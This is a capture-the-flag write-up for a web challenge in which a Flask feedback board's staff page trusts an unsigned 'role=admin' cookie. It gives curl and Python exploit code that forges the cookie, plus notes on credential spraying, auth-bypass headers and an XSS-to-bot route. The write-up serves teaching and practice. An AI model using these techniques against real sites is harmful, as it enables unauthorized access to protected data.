---
title: "Midnight Feedback"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: medium
points: 450
flag_format: "safctf{...}"
author: "Strawhats"
---

# Midnight Feedback

## Summary

`http://54.72.82.22:8111` is a Flask feedback board ("Birchwood Post") behind
gunicorn. The briefing pointed at a staff review console and told us to *"reach
the reviewer, slip into the hollow, and take what the staff keep there."* The
console's authorization turned out to be a single **unsigned, client-controlled
cookie** — `role=admin`. There is no login, no session store, and no signature.
Forging that one header value walks straight into the staff hollow and prints
the flag.

- **Vulnerability:** broken access control — authorization decision taken from a
  client-supplied cookie with no integrity protection.
- **Class:** CWE-565 (reliance on cookies without validation) / CWE-807
  (reliance on untrusted inputs in a security decision).
- **Impact:** full read of the staff-only view, flag disclosure.

## Recon

The blurb was unusually explicit about the shape of the challenge:

> Leave a note on the hill. A keeper reads the board every few minutes — and the
> review console isn't as careful as it looks. Reach the reviewer, slip into the
> hollow, and take what the staff keep there.

Three phrases map onto concrete things to try: "review console" → an admin
surface exists; "isn't as careful as it looks" → the check is weak; "slip into"
→ get *in*, not *past* (i.e. authenticate rather than bypass outright). The
public site is a landing page with a single note form.

Fingerprinting the stack:

```bash
curl -sI http://54.72.82.22:8111/ | head -5
# Server: gunicorn
# Werkzeug-style 404/405 pages -> Flask
```

Route enumeration gave the full surface. Everything below is what the
application actually registered:

| Route | Method | Result |
| --- | --- | --- |
| `/` | GET | Landing page — `POST /feedback` note form |
| `/feedback` | POST | Stores a note, `302 -> /thanks` |
| `/thanks` | GET | "Pinned to the board" confirmation |
| `/admin/login` | GET/POST | Keeper's desk login; bad creds → `200` + "Invalid credentials" |
| `/admin` | GET | `302 -> /admin/login` |
| `/admin/notes` | GET | `403 Unauthorized` — the "hollow" |

So the shape is the classic one: a login page that looks like the gate, and an
actual content endpoint behind it that answers `403` instead of redirecting.

## Finding the bug

Two paths were open at this point — guess the login, or understand the guard.
The login is a dead end by design and we proved it empirically: a credential
spray produced nothing but the same `200 "Invalid credentials"` page, and no
username/password pair in the family's usual wordlists moved the needle.

That failure was itself the useful signal. If `/admin/notes` returns a bare
`403` rather than redirecting an unauthenticated user to `/admin/login`, then
the request reaching it carries *something* the app treats as a failed
authorization decision. The candidate that fits a Flask app with no visible
session cookie is simple:

**The guard reads the role out of a cookie.**

We tested the hypothesis directly, and swept the plausible role *values* to find
the exact string the check expects:

```bash
for r in admin keeper staff administrator ADMIN Admin reviewer; do
  printf '%-14s -> ' "$r"
  curl -s -o /dev/null -w '%{http_code}\n' \
    http://54.72.82.22:8111/admin/notes -H "Cookie: role=$r"
done
```

Result:

```
admin          -> 200
keeper         -> 403
staff          -> 403
administrator  -> 403
ADMIN          -> 403
Admin          -> 403
reviewer       -> 403
```

Only the exact literal `admin` passes. That tells us two things at once: the
cookie is the entire authorization decision, and it is compared as a plain
string with no normalization — there is no session table behind it, because
`keeper` and `staff` (the names the challenge theme suggests) are rejected. The
login form at `/admin/login` is an unrelated decoy; auth never consults it.

## Exploitation

```bash
curl -s http://54.72.82.22:8111/admin/notes -H 'Cookie: role=admin'
```

The response is the staff view, a page titled **"The hollow"**, containing:

```html
<div class="secret">safctf{f0e94a82-6662-4649-8b44-cb6fd2f8323a}</div>
```

That is the whole exploit — one forged header, no credentials.

### Reproducible script

```python
#!/usr/bin/env python3
"""Midnight Feedback (web, 450) — Birchwood Post @ 54.72.82.22:8111

The "keeper's desk" guard on /admin/notes trusts a client-controlled cookie:

    Cookie: role=admin

No login, no signature. Send it and the staff hollow prints the flag.
"""
import http.client
import re

HOST, PORT = "54.72.82.22", 8111


def req(method, path, body=None, headers=None, timeout=10):
    # NOTE: this host's gunicorn drops python-requests keep-alive connections
    # (read timeouts), so we drive http.client with an explicit Connection:
    # close on every call.
    c = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    h = {"Connection": "close", "User-Agent": "curl/8.5.0"}
    if headers:
        h.update(headers)
    try:
        c.request(method, path, body=body, headers=h)
        r = c.getresponse()
        return r.status, dict(r.getheaders()), r.read()
    finally:
        c.close()


if __name__ == "__main__":
    st, hd, data = req("GET", "/admin/notes", headers={"Cookie": "role=admin"})
    print(f"[*] GET /admin/notes -> {st}")
    text = data.decode(errors="replace")
    m = re.search(r"safctf\{[^}]+\}", text)
    print(text)
    if m:
        print(f"\n[+] FLAG: {m.group(0)}")
```

### Operational note

`python-requests` keep-alive against this host hung repeatedly with read
timeouts, because the gunicorn worker closed the connection without the client
expecting it. Switching to `http.client` with `Connection: close` on every
request made the exploit deterministic. This is a harness detail, not part of
the vulnerability, but it cost time — worth knowing for the rest of this
challenge family.

## Dead ends (kept brief)

- **Route enumeration** for `/board`, `/notes`, `/wall`, `/review`, `/keeper`,
  `/staff`, `/flag`, `/.env`, `/api/notes` — all `404`. `/admin/notes` is the
  only hidden route.
- **Auth-bypass header spraying** — `X-Forwarded-For: 127.0.0.1`,
  `X-Original-URL`, `X-Rewrite-URL`, HTTP Basic, `admin=1`, `is_admin=1` — all
  `403`. The `role` cookie is the *only* thing the guard consults.
- **Credential guessing on `/admin/login`** — decoy; no pair ever worked,
  because the route is not wired to the authorization decision at all.

## Note on the intended path

The challenge text ("a keeper reads the board every few minutes") strongly
suggests the intended solution was **stored XSS against a keeper bot**: submit a
note that runs JavaScript in the reviewer's browser, which then sets this same
`role=admin` cookie in the admin's own session. That is consistent with
everything we observed — the cookie the bot would set is exactly the cookie we
forged. But because the cookie is attacker-forgeable and unsigned, the bot, the
XSS, and the whole browser-attack step are unnecessary: we can simply assert the
role ourselves. The vulnerability is the missing signature, not the XSS.

## Tools

**Used in this solve:**

- Python 3 `http.client` (the host drops `requests` keep-alive, so an explicit `Connection: close` was required)
- curl (quick cookie-forging one-liner)

**Other tools that fit this task:**

- Burp Suite / mitmproxy (cookie tampering + repeater)
- a browser cookie editor / EditThisCookie (set `role=admin` interactively)
- ffuf / feroxbuster (route discovery for `/admin/notes`)
- an XSS payload + a webhook (the *intended* stored-XSS-to-keeper-bot path)

## Flag

```
safctf{f0e94a82-6662-4649-8b44-cb6fd2f8323a}
```
